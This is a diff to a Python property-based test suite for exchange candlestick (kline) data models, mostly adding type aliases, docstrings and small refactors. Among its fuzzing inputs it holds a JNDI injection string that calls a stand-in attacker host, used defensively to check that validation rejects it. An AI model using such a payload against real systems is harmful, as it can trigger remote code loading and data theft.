@@ -1,7 +1,7 @@
 """Property-based tests for Backpack raw kline (candlestick) models.
 
 These tests validate critical security boundary models that process external market kline data.
-The models tested here are essential for candlestick charting, OHLCV analysis, and technical indicators.
+The models tested here are essential for candlestick charting, OHLCV analysis, and indicators.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious kline data that could manipulate market analysis
@@ -15,10 +15,9 @@ Property testing ensures comprehensive coverage of kline edge cases and adversar
 """
 
 from decimal import Decimal
-from typing import Any
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
@@ -29,16 +28,30 @@ from cyberdelta.exceptions.parsing import EmptyStringError
 
 
 # =============================================================================
+# TYPE DEFINITIONS FOR KLINE MODEL TESTING
+# =============================================================================
+
+MaliciousValue = str | int | float | bool | bytes | list[str] | dict[str, str] | None
+
+# Kline data structure: [startTimeMs, openPrice, highPrice, lowPrice, closePrice,
+# volume, endTimeMs, quoteVolume, tradeCount, takerBuyBaseVolume, takerBuyQuoteVolume, ignored]
+KlineData = list[int | str]
+
+# =============================================================================
 # HYPOTHESIS STRATEGIES FOR KLINE MODEL TESTING
 # =============================================================================
 
 
 def kline_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for kline OHLCV fields."""
+    """Generate decimal strings for kline OHLCV fields.
+
+    Returns:
+        A Hypothesis strategy for decimal strings used in OHLCV data.
+    """
     return st.one_of([
         # Market price/volume amounts
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=6).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=6).map(str),
         # Common kline values
         st.just("0"),
         st.just("0.0"),
@@ -56,7 +69,11 @@ def kline_decimal_strategy() -> SearchStrategy[str]:
 
 
 def kline_timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp integers for kline data."""
+    """Generate valid timestamp integers for kline data.
+
+    Returns:
+        A Hypothesis strategy for valid timestamp integers.
+    """
     return st.one_of([
         # Unix timestamps (milliseconds)
         st.integers(min_value=1000000000000, max_value=2000000000000),
@@ -71,7 +88,11 @@ def kline_timestamp_strategy() -> SearchStrategy[int]:
 
 
 def kline_trade_count_strategy() -> SearchStrategy[int]:
-    """Generate valid trade count integers."""
+    """Generate valid trade count integers.
+
+    Returns:
+        A Hypothesis strategy for valid trade count integers.
+    """
     return st.one_of([
         # Common ranges
         st.integers(min_value=0, max_value=10000),
@@ -86,7 +107,11 @@ def kline_trade_count_strategy() -> SearchStrategy[int]:
 
 
 def kline_ignored_field_strategy() -> SearchStrategy[str]:
-    """Generate valid ignored field strings."""
+    """Generate valid ignored field strings.
+
+    Returns:
+        A Hypothesis strategy for valid ignored field strings.
+    """
     return st.one_of([
         # Common patterns
         st.just("0"),
@@ -109,8 +134,12 @@ def kline_ignored_field_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_kline_list_data(draw) -> list[Any]:
-    """Generate valid kline list data structure."""
+def valid_kline_list_data(draw: st.DrawFn) -> KlineData:
+    """Generate valid kline list data structure.
+
+    Returns:
+        A list containing valid kline data fields in order.
+    """
     return [
         draw(kline_timestamp_strategy()),  # startTimeMs
         draw(kline_decimal_strategy()),  # openPrice
@@ -128,10 +157,14 @@ def valid_kline_list_data(draw) -> list[Any]:
 
 
 @st.composite
-def valid_ohlc_kline_list_data(draw) -> list[Any]:
-    """Generate valid kline list data with realistic OHLC relationships."""
+def valid_ohlc_kline_list_data(draw: st.DrawFn) -> KlineData:
+    """Generate valid kline list data with realistic OHLC relationships.
+
+    Returns:
+        A list containing valid kline data with proper OHLC relationships.
+    """
     # Generate base price and derive OHLC from it
-    base_price = draw(st.decimals(min_value=Decimal("1"), max_value=Decimal("100000"), places=6))
+    base_price = draw(st.decimals(min_value=Decimal(1), max_value=Decimal(100000), places=6))
 
     # Generate realistic price variations (±10% of base price)
     price_variation = base_price * Decimal("0.1")
@@ -148,10 +181,10 @@ def valid_ohlc_kline_list_data(draw) -> list[Any]:
     min_oc = min(open_price, close_price)
 
     high_price = max_oc + draw(
-        st.decimals(min_value=Decimal("0"), max_value=price_variation, places=6)
+        st.decimals(min_value=Decimal(0), max_value=price_variation, places=6)
     )
     low_price = min_oc - draw(
-        st.decimals(min_value=Decimal("0"), max_value=price_variation, places=6)
+        st.decimals(min_value=Decimal(0), max_value=price_variation, places=6)
     )
 
     # Ensure low is not negative
@@ -174,8 +207,12 @@ def valid_ohlc_kline_list_data(draw) -> list[Any]:
     ]
 
 
-def malicious_kline_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for kline security testing."""
+def malicious_kline_strategy() -> SearchStrategy[MaliciousValue]:
+    """Generate malicious values for kline security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious values to test security boundaries.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-klines}"),
@@ -216,8 +253,12 @@ def malicious_kline_strategy() -> SearchStrategy[Any]:
     ])
 
 
-def invalid_kline_structure_strategy() -> SearchStrategy[Any]:
-    """Generate invalid structures for kline validation testing."""
+def invalid_kline_structure_strategy() -> SearchStrategy[MaliciousValue]:
+    """Generate invalid structures for kline validation testing.
+
+    Returns:
+        A Hypothesis strategy for invalid data structures.
+    """
     return st.one_of([
         # Wrong types
         st.none(),
@@ -233,9 +274,9 @@ def invalid_kline_structure_strategy() -> SearchStrategy[Any]:
         # Empty collections
         st.just([]),
         st.just({}),
-        # Nested structures
-        st.lists(st.dictionaries(st.text(), st.integers())),
-        st.dictionaries(st.text(), st.lists(st.text())),
+        # Nested structures (using simpler types compatible with MaliciousValue)
+        st.lists(st.text()),  # list[str] is compatible
+        st.dictionaries(st.text(), st.text()),  # dict[str, str] is compatible
     ])
 
 
@@ -248,8 +289,8 @@ class TestBackpackRawKlineResponseProperties:
     """Property-based tests for BackpackRawKlineResponse validation and security."""
 
     @given(kline_data=valid_kline_list_data())
-    def test_kline_validation_success_properties(self, kline_data: list[Any]) -> None:
-        """Property: Valid kline data should always create valid BackpackRawKlineResponse objects."""
+    def test_kline_validation_success_properties(self, kline_data: KlineData) -> None:
+        """Property: Valid kline data should always create valid objects."""
         # Skip invalid decimal values
         try:
             decimal_indices = [1, 2, 3, 4, 5, 7, 9, 10]  # OHLCV and taker volumes
@@ -265,8 +306,10 @@ class TestBackpackRawKlineResponseProperties:
         assume(isinstance(kline_data[8], int) and kline_data[8] >= 0)  # tradeCount
 
         # Skip empty or invalid ignored field
-        assume(isinstance(kline_data[11], str) and kline_data[11].strip())
-        assume(len(kline_data[11].encode("utf-8")) <= 64)
+        ignored_field = kline_data[11]
+        assume(isinstance(ignored_field, str) and ignored_field.strip())
+        if isinstance(ignored_field, str):  # Help mypy understand type narrowing
+            assume(len(ignored_field.encode("utf-8")) <= 64)
 
         obj = BackpackRawKlineResponse.model_validate(kline_data)
 
@@ -308,7 +351,7 @@ class TestBackpackRawKlineResponseProperties:
         assert obj.model_config.get("populate_by_name") is True
 
     @given(kline_data=valid_ohlc_kline_list_data())
-    def test_kline_ohlc_properties(self, kline_data: list[Any]) -> None:
+    def test_kline_ohlc_properties(self, kline_data: KlineData) -> None:
         """Property: Valid OHLC kline data should create consistent objects."""
         # This test ensures we can handle realistic OHLC relationships
         # Note: Raw models don't enforce OHLC business logic per policy
@@ -343,10 +386,10 @@ class TestBackpackRawKlineResponseProperties:
         malicious_value=malicious_kline_strategy(),
     )
     def test_kline_security_boundary_properties(
-        self, field_index: int, malicious_value: Any
+        self, field_index: int, malicious_value: MaliciousValue
     ) -> None:
         """Property: Kline model should reject malicious inputs safely."""
-        base_data = [
+        base_data: list[int | str | MaliciousValue] = [
             1700000000000,  # startTimeMs
             "100.0",  # openPrice
             "102.5",  # highPrice
@@ -374,7 +417,7 @@ class TestBackpackRawKlineResponseProperties:
             BackpackRawKlineResponse.model_validate(base_data)
 
     @given(invalid_structure=invalid_kline_structure_strategy())
-    def test_kline_structure_validation_properties(self, invalid_structure: Any) -> None:
+    def test_kline_structure_validation_properties(self, invalid_structure: MaliciousValue) -> None:
         """Property: Kline model should reject invalid structures safely."""
         # Property: Invalid structures should be rejected
         with pytest.raises((ValidationError, TypeError, SequenceLengthError)) as exc_info:
@@ -392,10 +435,7 @@ class TestBackpackRawKlineResponseProperties:
     def test_kline_length_validation_properties(self, list_length: int) -> None:
         """Property: Kline model should reject lists with wrong length."""
         # Generate list with wrong length
-        if list_length < 12:
-            wrong_length_list = ["value"] * list_length
-        else:
-            wrong_length_list = ["value"] * list_length
+        wrong_length_list = ["value"] * list_length
 
         # Property: Wrong length should be rejected
         with pytest.raises((ValidationError, SequenceLengthError)) as exc_info:
@@ -499,10 +539,10 @@ class TestBackpackRawKlineResponseProperties:
         ]),
     )
     def test_kline_integer_validation_properties(
-        self, timestamp_index: int, timestamp_value: Any
+        self, timestamp_index: int, timestamp_value: MaliciousValue
     ) -> None:
         """Property: Kline integer fields should validate properly."""
-        kline_data = [
+        kline_data: list[int | str | MaliciousValue] = [
             1700000000000,  # startTimeMs
             "100.0",  # openPrice
             "102.5",  # highPrice
@@ -550,7 +590,7 @@ class TestBackpackRawKlineResponseProperties:
             st.lists(st.text()),
         ])
     )
-    def test_kline_ignored_field_validation_properties(self, ignored_value: Any) -> None:
+    def test_kline_ignored_field_validation_properties(self, ignored_value: MaliciousValue) -> None:
         """Property: Kline ignored field should validate properly."""
         kline_data = [
             1700000000000,  # startTimeMs
@@ -581,7 +621,7 @@ class TestBackpackRawKlineResponseProperties:
                 BackpackRawKlineResponse.model_validate(kline_data)
 
     @given(kline_data=valid_kline_list_data())
-    def test_kline_immutability_properties(self, kline_data: list[Any]) -> None:
+    def test_kline_immutability_properties(self, kline_data: KlineData) -> None:
         """Property: Kline objects should be immutable after creation."""
         # Skip invalid data
         try:
@@ -606,12 +646,13 @@ class TestBackpackRawKlineResponseProperties:
             obj.trade_count = 9999
 
     @given(kline_data=valid_kline_list_data())
-    def test_kline_financial_precision_properties(self, kline_data: list[Any]) -> None:
+    def test_kline_financial_precision_properties(self, kline_data: KlineData) -> None:
         """Property: Kline model should preserve financial precision exactly."""
         # Only test valid finite decimals
+        decimal_indices = [1, 2, 3, 4, 5, 7, 9, 10]
+        decimal_values: list[Decimal] = []
+
         try:
-            decimal_indices = [1, 2, 3, 4, 5, 7, 9, 10]
-            decimal_values = []
             for idx in decimal_indices:
                 decimal_val = Decimal(kline_data[idx])
                 assume(decimal_val.is_finite() and decimal_val >= 0)
@@ -647,7 +688,9 @@ class TestBackpackRawKlineResponseProperties:
         assert obj.taker_buy_quote_volume.is_finite()
 
     @given(adversarial_data=st.lists(malicious_kline_strategy(), min_size=12, max_size=12))
-    def test_kline_adversarial_input_properties(self, adversarial_data: list[Any]) -> None:
+    def test_kline_adversarial_input_properties(
+        self, adversarial_data: list[MaliciousValue]
+    ) -> None:
         """Property: Kline model should safely handle complete adversarial input."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((
@@ -660,7 +703,7 @@ class TestBackpackRawKlineResponseProperties:
             BackpackRawKlineResponse.model_validate(adversarial_data)
 
     @given(tuple_data=valid_kline_list_data())
-    def test_kline_tuple_input_properties(self, tuple_data: list[Any]) -> None:
+    def test_kline_tuple_input_properties(self, tuple_data: KlineData) -> None:
         """Property: Kline model should accept both list and tuple inputs."""
         # Skip invalid data
         try:
@@ -746,12 +789,12 @@ def test_BackpackRawKlineResponse_edge_case_example() -> None:
     assert obj.high_price == Decimal("0.00000002")
     assert obj.low_price == Decimal("0.00000001")
     assert obj.close_price == Decimal("0.00000001")
-    assert obj.volume == Decimal("0")
+    assert obj.volume == Decimal(0)
     assert obj.end_time_ms == 59999
-    assert obj.quote_volume == Decimal("0")
+    assert obj.quote_volume == Decimal(0)
     assert obj.trade_count == 0
-    assert obj.taker_buy_base_volume == Decimal("0")
-    assert obj.taker_buy_quote_volume == Decimal("0")
+    assert obj.taker_buy_base_volume == Decimal(0)
+    assert obj.taker_buy_quote_volume == Decimal(0)
     assert obj.ignored == "unused"
 
 
